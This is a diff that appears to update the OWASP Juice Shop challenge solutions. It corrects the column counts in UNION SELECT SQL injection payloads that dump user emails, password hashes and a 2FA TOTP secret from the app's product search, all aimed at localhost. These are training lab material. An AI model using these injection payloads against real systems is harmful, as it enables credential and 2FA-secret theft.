@@ -1195,23 +1195,23 @@ NPM page:
    3. `')) UNION SELECT '1', '2', '3' FROM Users--` fails with `number
       of result columns` error
    4. (...)
-   5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7' FROM Users--`
+   5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM Users--`
       _still fails_ with `number of result columns` error
-   6. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
+   6. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM
       Users--` finally gives you a JSON response back with an extra
       element
-      `{"id":"1","name":"2","description":"3","price":"4","image":"5","createdAt":"6","updatedAt":"7","deletedAt":"8"}`.
+      `{"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}`.
 
 7. Next you get rid of the unwanted product results changing the query
    into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5',
-   '6', '7', '8' FROM Users--` leaving only the "`UNION`ed" element in
+   '6', '7', '8', '9' FROM Users--` leaving only the "`UNION`ed" element in
    the result set
 8. The last step is to replace the fixed values with correct column
    names. You could guess those **or** derive them from the RESTful API
    results **or** remember them from previously seen SQL errors while
    attacking the _Login_ form.
 9. Searching for `qwert')) UNION SELECT '1', id, email, password, '5',
-   '6', '7', '8' FROM Users--` solves the challenge giving you a the
+   '6', '7', '8', '9' FROM Users--` solves the challenge giving you a the
    list of all user data in convenient JSON format.
 
    ![User list from UNION SELECT attack](img/union_select-attack_result.png)
@@ -1554,21 +1554,21 @@ corresponding flag will eventually spoiler the language code `tlh_AA`.
    and keep its final attack payload ready.
 5. Change the one of the `null`s in payload to hopefully find a column
    that contains the secret key for the 2FA setup:
-   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fa,null,null,null%20from%20users-->
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fa,null,null,null,null%20from%20users-->
      yields a `500` error with `SequelizeDatabaseError: SQLITE_ERROR: no
      such column: 2fa`.
-   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fakey,null,null,null%20from%20users-->
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fakey,null,null,null,null%20from%20users-->
      fails with `no such column: 2fakey`.
-   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fasecret,null,null,null%20from%20users-->
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fasecret,null,null,null,null%20from%20users-->
      fails with `no such column: 2fasecret`.
-   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totp,null,null,null%20from%20users-->
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totp,null,null,null,null%20from%20users-->
      also fails with `no such column: totp`.
-   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpkey,null,null,null%20from%20users-->
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpkey,null,null,null,null%20from%20users-->
      fails again yielding `no such column: totpkey`.
-   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null%20from%20users-->
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users-->
      finally succeeds with a `200` response as this column exists!
 6. In the response from
-   <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null%20from%20users-->
+   <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users-->
    find the entry of user `wurstbrot@juice-sh.op` with
    `"image":"IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"` whereas all other users
    have `"image":""` set.
